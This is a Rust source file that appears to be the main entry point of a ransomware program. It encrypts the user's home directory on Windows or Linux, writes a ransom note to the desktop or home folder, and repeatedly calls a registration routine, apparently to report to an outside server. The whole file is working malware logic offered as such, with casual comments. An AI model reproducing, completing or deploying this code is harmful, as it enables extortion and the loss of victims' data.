mod crypto;
use crypto::encrypt_directory;
use crypto::register;
use std::env;
use std::thread::sleep;
use std::time::Duration;
use std::fs::File;
use std::io::Write;

const NOTE: &str = include_str!("../note.txt");

fn main() -> std::io::Result<()> {
    #[cfg(target_os = "windows")]
    let home: String = env::var("USERPROFILE").unwrap_or("C:\\Users\\Xory".to_string()); // no way this could fail!
    #[cfg(target_os = "windows")]
    let ransomnoteloc = format!("{home}\\Desktop\\README.txt");

    #[cfg(target_os = "linux")]
    let home: String = env::var("HOME").unwrap();
    #[cfg(target_os = "linux")]
    let ransomnoteloc = format!("{home}/readme.txt");

    encrypt_directory(&home).unwrap(); // I know this many unwraps look
                                       // suspicious, but the chance of this
                                       // failing is less than a solar flare.
    // Write ransom note to desktop
    let mut ransomnote = File::create(ransomnoteloc)?; // we *should* have write perms for
                                                      // the user's HOME
    ransomnote.write_all(NOTE.as_bytes())?;
    ransomnote.flush()?;


    loop {
        let registration_attempt = register();
        if registration_attempt.is_ok() {
            break;
        } else {
            sleep(Duration::from_secs(5));
        }
    }

    Ok(())
}
